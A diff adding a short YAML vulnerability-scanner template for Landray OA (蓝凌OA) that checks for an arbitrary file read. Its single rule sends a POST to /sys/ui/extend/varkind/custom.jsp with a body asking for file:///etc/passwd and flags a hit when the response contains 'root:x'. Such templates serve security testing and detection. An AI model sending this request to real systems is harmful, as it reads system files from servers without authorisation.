@@ -1,0 +1,15 @@
+name: 蓝凌OA-Diretory
+description: >-
+  任意文件读取
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: POST
+    path: /sys/ui/extend/varkind/custom.jsp
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    body: >-
+      var={"body":{"file":"file:///etc/passwd"}}
+    expression:
+      status: 200
+      body_all: ["root:x"]
